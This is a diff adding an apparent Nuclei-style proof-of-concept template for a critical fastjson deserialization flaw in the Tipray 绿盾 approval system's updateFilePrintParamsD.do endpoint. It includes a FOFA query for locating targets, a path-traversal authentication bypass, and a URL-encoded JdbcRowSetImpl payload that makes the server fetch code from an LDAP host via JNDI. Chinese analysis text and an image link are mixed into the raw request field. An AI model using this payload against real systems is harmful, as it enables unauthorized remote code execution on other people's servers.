@@ -1,0 +1,40 @@
+id: poc-ntqdgwq1qpzt5g9u
+info:
+  name: 天锐绿盾审批系统updateFilePrintParamsD.do存在反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ntqdgwq1qpzt5g9u'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ntqdgwq1qpzt5g9u
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'fastjson的版本1.2.7版本，非最新版，则存在反序列化rce漏洞的。
+
+    再看updateFilePrintParamsD.do 的实现部分
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1766319349187-a219f83e-ac36-4c77-8129-06e94f23ed60.png)
+
+    params参数被直接用于JSONObject.parseObject进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。
+
+
+    使用Java Chains的JNDILDAPDeserializePayload下的Fastjson反序列化链配合One For All Echo 回显来完成利用。
+
+
+    POST /trwfe/login.jsp/.%2e/task/updateFilePrintParamsD.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Authorization: dir
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+%22ldap%3A%2F%2F192.168.168.11%3A50389%2F165c51%22%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
